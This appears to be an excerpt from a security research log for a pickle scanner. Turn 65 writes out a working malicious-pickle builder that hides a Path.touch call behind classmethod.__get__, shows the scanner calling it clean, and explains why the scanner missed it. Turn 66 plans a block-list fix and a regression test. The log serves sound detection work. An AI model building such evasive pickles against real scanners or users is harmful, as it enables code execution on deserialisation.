## Turn 65 - `builtins.classmethod.__get__` bound-method gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using `classmethod.__get__` to
bind an attacker-selected function to an attacker-controlled object before a
later stack call.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_builtins_classmethod_get_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "classmethod"),
        sg("pathlib", "Path.touch"),
        b"\x85R\x94",
        sg("builtins", "classmethod.__get__"),
        b"(",
        b"h\x00",
        b"N",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"tR\x94",
        b"h\x01)R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=163`, `bytes_total=163`, `opcode_count=32`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.classmethod`, `pathlib.Path.touch`,
  `builtins.classmethod.__get__`, and `pathlib.PosixPath`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final empty-argument `REDUCE`
  returns `<bound method Path.touch of PosixPath(...)>` and does not create
  `/tmp/ma_builtins_classmethod_get_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_builtins_classmethod_get_marker` and returns `None`
- RCE mechanism: `classmethod.__get__(cm, None, marker)` returns a bound method
  whose `__self__` is the marker path. The payload first constructs
  `classmethod(pathlib.Path.touch)`, then uses the unbound descriptor getter to
  synthesize `Path.touch` bound to the attacker-chosen `Path`, then invokes the
  bound method with an empty argument tuple during deserialization.

Why the scanner missed it:

- `builtins.classmethod` is absent from `BUILTIN_DANGEROUS_NAMES`.
- `builtins.classmethod.__get__` is also absent from
  `BUILTIN_DANGEROUS_NAMES`, and builtin checks are exact-name checks even
  when the pickle `STACK_GLOBAL` name contains dots.
- The payload uses only currently clean globals:
  `builtins.classmethod`, `pathlib.Path.touch`,
  `builtins.classmethod.__get__`, and `pathlib.PosixPath`.
- The dangerous callable is hidden inside a synthesized bound method before
  the final stack-object call, so the final `REDUCE` has no policy-listed
  global to classify.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is the `classmethod` sibling of the descriptor-method
surface, and the focused next block can stay cheap: add `classmethod.__get__`
to `BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression proving
scan-time detection before the bound method creates the marker. The hot path
remains the existing builtin exact-name membership check.

## Turn 66 - Block `builtins.classmethod.__get__` bound methods

Blocking plan:

- Add `classmethod.__get__` to `BUILTIN_DANGEROUS_NAMES`. The exact dotted
  builtin name reaches the descriptor method that can bind an attacker-selected
  function to an attacker-controlled object.
- Leave `builtins.classmethod` itself allowed because constructing the
  descriptor does not execute or bind the wrapped callable. The sink is the
  descriptor-get method that synthesizes the later callable bound method.
- Add a CPython oracle regression that builds the manual
  `classmethod(Path.touch)` payload, verifies scan-time detection on the
  descriptor-get control and RCE variants, proves the control bound method does
  not create the marker, then proves the full payload creates the marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix is a single exact builtin-name membership check. It
does not add descriptor-object tracking, bound-method state modeling, or stack
call simulation.
